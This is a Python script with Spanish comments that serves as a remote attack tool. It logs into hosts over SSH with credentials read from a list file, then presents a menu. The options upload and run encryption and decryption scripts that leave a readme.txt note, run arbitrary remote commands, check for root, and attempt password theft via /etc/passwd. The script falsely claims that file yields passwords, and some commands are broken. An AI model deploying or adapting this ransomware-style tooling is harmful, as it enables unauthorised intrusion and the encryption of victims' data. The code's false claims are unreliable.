import paramiko
import socket
import time
import os
import subprocess
from cryptography.fernet import Fernet

# Función para conectar vía SSh y despliegue del menú
def ssh_connect_from_file(file_path, timeout=1):
    key_path = generate_key()

    if not os.path.exists(key_path):
        print(f"Error: No se pudo generar la clave en {key_path}")
        return

    with open(file_path, 'r') as file:
        lines = file.readlines()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for line in lines:
        hostname, username, password = line.strip().split(',')

        try:
            print(f"Intentando conectar a {hostname} como {username}...")
            client.connect(hostname, username=username, password=password, timeout=timeout)
            print("\nConexión SSH exitosa!")

            while True:
                opcion = menu_principal()

                if opcion == '1':
                    directories = print_directories(client)
                    path = input("Ingrese el directorio al que desea acceder (o 'salir' para volver al menú): ").strip()
                    if path.lower() != 'salir':
                        access_directory(client, path)

                elif opcion == '2':
                    path_to_encrypt = input("Ingrese la ruta del archivo o directorio a encriptar (ej. /home/kali/Desktop): ").strip()
                    sftp = client.open_sftp()
                    sftp.put('encrypt.py', '/tmp/encrypt.py')
                    sftp.close()
                    print("\nScript de encriptación transferido.")
                    
                    # Ejecutar el script de encriptación con la ruta como argumento
                    stdin, stdout, stderr = client.exec_command(f'python3 /tmp/encrypt.py "{path_to_encrypt}"')
                    
                    # Imprimir la salida del script en tiempo real
                    while not stdout.channel.exit_status_ready():
                        if stdout.channel.recv_ready():
                            print(stdout.channel.recv(1024).decode(), end='')
                    
                    # Imprimir cualquier error si lo hubiera
                    error = stderr.read().decode()
                    if error:
                        print("Error:", error)
                    
                    
                    # Verificar el contenido del archivo readme.txt creado
                    stdin, stdout, stderr = client.exec_command(f'cat {os.path.dirname(path_to_encrypt)}/readme.txt')
                    print("Fichero Readme creado correctamente en el escritorio del usuario")
                    print(stdout.read().decode())

                elif opcion == '3':
                    path_to_decrypt = input("Ingrese la ruta del directorio a desencriptar (ej. /home/kali/Desktop): ").strip()
                    sftp = client.open_sftp()
                    sftp.put('decrypt.py', '/tmp/decrypt.py')
                    sftp.close()
                    print("\nScript de desencriptación transferido.")
                    
                    # Ejecutar el script de desencriptación con la ruta como argumento
                    stdin, stdout, stderr = client.exec_command(f'python3 /tmp/decrypt.py "{path_to_decrypt}"')
                    
                    # Imprimir la salida del script en tiempo real
                    while not stdout.channel.exit_status_ready():
                        if stdout.channel.recv_ready():
                            print(stdout.channel.recv(1024).decode(), end='')
                    
                    # Imprimir cualquier error si lo hubiera
                    error = stderr.read().decode()
                    if error:
                        print("Error:", error)
                    

                elif opcion == '4':
                    local_path = input("Ingrese la ruta del archivo local: ").strip()
                    transfer_file(client, local_path, password)

                elif opcion == '5':
                    check_remote_privileges(client)

                elif opcion == '6':
                    execute_remote_command(client)

                # elif opcion == '6':
                #     execute_local_command() 

                elif opcion == '7':
                    print("Saliendo...")
                    client.close()
                    return

                else:
                    print("Opción no válida. Por favor, intente de nuevo.")

        except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout) as e:
            print(f"Error al intentar conectar a {hostname}: {e}")
            time.sleep(1)
        finally:
            client.close()

# Función de la encriptación
def generate_key():
    key = Fernet.generate_key()
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'key.key')
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
    print(f"Clave generada y guardada en: {key_path}")
    return key_path

# Función para mostrar directorios remotos
def print_directories(client):
    try:
        stdin, stdout, stderr = client.exec_command('ls -l')
        directories = stdout.read().decode().splitlines()
        print("\nDirectorios y archivos en el directorio actual:")
        for line in directories:
            print(line)
        return directories
    except Exception as e:
        print(f"\nError al listar directorios: {e}")
        return []

def access_directory(client, path):
    try:
        stdin, stdout, stderr = client.exec_command(f'ls -l {path}')
        contents = stdout.read().decode().splitlines()
        print(f"Contenido del directorio {path}:")
        for line in contents:
            print(line)
    except Exception as e:
        print(f"Error al acceder al directorio {path}: {e}")

# Función para la transferencia de archivos
def transfer_file(client, local_path, password):
    try:
        # Verificar si el archivo local existe y si tenemos permisos de lectura
        if not os.path.exists(local_path):
            print(f"Error: El archivo local '{local_path}' no existe.")
            return
        if not os.access(local_path, os.R_OK):
            print(f"Error: No tienes permisos de lectura para '{local_path}'.")
            return

        # Obtener el nombre del archivo
        file_name = os.path.basename(local_path)

        # Solicitar al usuario la ruta de destino en la máquina remota
        remote_path = input("Ingrese la ruta de destino en la máquina remota (ej. /home/kali/Desktop): ").strip()
        remote_file_path = f"{remote_path}/{file_name}"

        # Transferir archivo
        sftp = client.open_sftp()
        try:
            sftp.put(local_path, remote_file_path)
            print(f"Archivo {local_path} transferido a {remote_file_path} en la máquina remota.")
        except IOError as e:
            print(f"Error al transferir el archivo: {e}")
            return
        finally:
            sftp.close()

        # Ajustar permisos del archivo en la máquina remota
        cmd = f"chmod 644 {remote_file_path}"
        stdin, stdout, stderr = client.exec_command(cmd)
        error = stderr.read().decode().strip()
        if error:
            print(f"Error al ajustar permisos: {error}")
        else:
            print("Permisos del archivo ajustados correctamente.")

    except Exception as e:
        print(f"Error al transferir archivo: {e}")


# Ejecutar comandos remotos
def execute_remote_command(client):
    while True:
        comando = input("Ingrese un comando para ejecutar en la máquina remota (o 'salir' para terminar): ").strip()
        if comando.lower() == 'salir':
            break
        try:
            stdin, stdout, stderr = client.exec_command(comando, get_pty=True)
            
            # Configurar un tiempo de espera para la salida
            tiempo_espera = 5  # segundos
            stdout.channel.settimeout(tiempo_espera)
            
            print("Salida del comando:")
            while not stdout.channel.exit_status_ready():
                if stdout.channel.recv_ready():
                    linea = stdout.channel.recv(1024).decode('utf-8')
                    print(linea, end='')
            
            # Verificar si hay errores
            if stderr.channel.recv_stderr_ready():
                print("Salida de error:")
                error = stderr.read().decode('utf-8')
                print(error)
            
        except socket.timeout:
            print(f"La ejecución del comando excedió el tiempo de espera de {tiempo_espera} segundos.")
        except Exception as e:
            print(f"Error al ejecutar el comando: {e}")

# Chequea si tenemos privilegios en la máquina atacante
def check_remote_privileges(client):
    try:
        # Check if we have root privileges
        stdin, stdout, stderr = client.exec_command("sudo su && kali")
        stdin, stdout, stderr = client.exec_command("kali")
        print(stdout.read().decode())

        stdin, stdout, stderr = client.exec_command("id -u")
        uid = stdout.read().decode().strip()

        if uid == "0":
            print("\nPrivilegios ROOT Obtenidos!")
            stdin, stdout, stderr = client.exec_command("hostname && whoami && id")
            details = stdout.read().decode().strip()
            print(f"Detalles: {details}")

            # Execute commands with root privileges
            stdin, stdout, stderr = client.exec_command("sudo apt update")
            print(stdout.read().decode())
            stdin, stdout, stderr = client.exec_command("sudo apt upgrade -y")
            print(stdout.read().decode())
        else:
            print("\nComandos ejecutados desde la máquina Linux sin ROOT")
            stdin, stdout, stderr = client.exec_command("hostname && whoami && id")
            details = stdout.read().decode().strip()
             
        # Get the username of the current user
        stdin, stdout, stderr = client.exec_command("echo $USER")
        user = stdout.read().decode().strip()
        print(f"Usuario: {user}")

        # Get the password of the current user by exploiting a vulnerability
        stdin, stdout, stderr = client.exec_command("cat /etc/passwd | grep $USER | awk '{print $2}'")
        password = stdout.read().decode().strip()
        print(f"Contraseña: {password}")
    except Exception as e:
        print(f"Error chequeando Privilegios: {e}")

# Función para ejecutar comandos locales en Windows
# def execute_local_command():
#     while True:
#         comando = input("Ingrese un comando para ejecutar en la consola local (o 'salir' para terminar): ").strip()
#         if comando.lower() == 'salir':
#             break
#         try:
#             resultado = subprocess.run(comando, shell=True, text=True, capture_output=True)
#             print("Salida del comando:")
#             print(resultado.stdout)
#             if resultado.stderr:
#                 print("Error del comando:")
#                 print(resultado.stderr)
#         except Exception as e:
#             print(f"Error al ejecutar el comando local: {e}")


def menu_principal():
    print("\nMenú Principal:")
    print("1: Ver directorios remoto")
    print("2: Encriptar archivos")
    print("3: Desencriptar archivos")
    print("4: Transferir archivos")
    print("5: Información de la sesión del Usuario")
    print("6: Ejecutar comandos remotos")
    # print("6: Ejecutar comandos locales") 
    print("7: Salir")
    return input("Seleccione una opción: ").strip()

ssh_connect_from_file('credenciales.txt')

